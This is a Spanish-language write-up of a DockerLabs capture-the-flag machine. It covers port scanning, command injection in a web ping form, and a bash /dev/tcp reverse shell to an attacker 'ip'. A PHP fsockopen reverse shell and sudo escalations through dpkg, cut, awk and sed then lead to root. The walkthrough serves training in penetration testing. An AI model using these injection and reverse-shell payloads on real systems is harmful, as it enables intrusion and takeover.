<img width="545" height="299" alt="Captura de pantalla 2025-09-23 170736" src="https://github.com/user-attachments/assets/2f8b1305-76a5-42d9-8122-fb5f55aab496" />

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)

# Enumeracion de Puertos,Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sV --min-rate 5000 172.17.0.2 -oN nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 22:35 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
5000/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Nos iremos al dominio en el puerto 5000 y veremos lo siguiente

<img width="1185" height="757" alt="image" src="https://github.com/user-attachments/assets/5b198aac-481f-43e5-95f3-9dc29549db12" />

Analizando mas este ping, nos damos  cuenta que podemos hacer una ejecucion de comandos remotos (Remote Code Execution. Es una vulnerabilidad/condición en la que un atacante puede hacer que un sistema remoto ejecute código arbitrario)

De tal manera nos ponemos en escucha con Net cat en el puerto 9001

```ruby
     nc -lvnp 9001
```

Iremos a preparar una revershell, usaremos && y despues la revshell


<img width="1185" height="659" alt="image" src="https://github.com/user-attachments/assets/e5269586-47ca-486c-9866-da930c69658f" />

```ruby
localhost && bash -c 'exec 5<>/dev/tcp/ip/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
```

ya tendriamos la conexion con esto:

<img width="476" height="166" alt="image" src="https://github.com/user-attachments/assets/78e83ecd-2821-4bb5-baba-b841fd86163a" />

# Acceso a maquina 

Aremos un tratamiento de la terminal, para no tener problas de ejecuciones 

```ruby
script /dev/null -c bash 
CTRL + Z 
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

Aremos un sudo -l, podemos ver que podremos ejecutar con el usuario Bobby el comando dpkg usaremos (https://gtfobins.github.io/) como guia 

<img width="1154" height="374" alt="image" src="https://github.com/user-attachments/assets/9bec57db-b3f8-4c8c-8e21-710d722e67bb" />

usando el comando y nos conectamos como bobby

<img width="1073" height="111" alt="image" src="https://github.com/user-attachments/assets/c1e3bb3d-bebd-4e24-b73c-61ff81a275f6" />

```ruby
sudo -u bobby /usr/bin/dpkg -l
!/bin/bash
```
ahora como el usuario gladys podemos ejecutar php

<img width="1040" height="102" alt="image" src="https://github.com/user-attachments/assets/9155eecb-80e0-4630-b018-985438f43a8a" />

nos podnremos ala escucha y mandremos un revshell de la maquina victima ala nuestra

```rubby
nc -lvpn 9002
sudo -u gladys /usr/bin/php -r '$sock=fsockopen("ip",9002);exec("bash <&3 >&3 2>&3");'
```

comprovamos que ya tenemos la conexion con gladys

<img width="832" height="148" alt="image" src="https://github.com/user-attachments/assets/f7c6e505-1a26-4ff0-9b7f-813afe8a52bd" />

veremos que podemos ejecutar cut, antes de hacerlo, vamos a darle un revisada a /opt veremos un archivo llamado chocolatitocontraseña.txt

para descomprimirlo usaremos cut nos mostrara el contendio del archivo de la siguiente manera

```ruby
sudo -u chocolatito  /usr/bin/cut -d "" -f1 "/opt/chocolatitocontraseña.txt"
chocolatitopassword
```
Hacemos un sudo  chocolatito y pondremos su password -> chocolatitopassword

<img width="1039" height="91" alt="image" src="https://github.com/user-attachments/assets/51bb19d4-b691-4356-9e1b-6b9bf026a86d" />

vemos que el usuario theboos veremos que podemos usar awk, Usaremos el siguiente comando para saltar al theboos 

```ruby
  sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```
Ahora podremos pivotear al usuario root 

<img width="1038" height="101" alt="image" src="https://github.com/user-attachments/assets/ede7ec2b-5ab5-4d6e-a3b7-2b774b847cd2" />

Usaremos lo siguiente:

```ruby
sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```
Veremos que ya somos usuario root
<img width="791" height="74" alt="image" src="https://github.com/user-attachments/assets/af3efff2-6198-4af3-bbf3-84e71be9e8bb" />
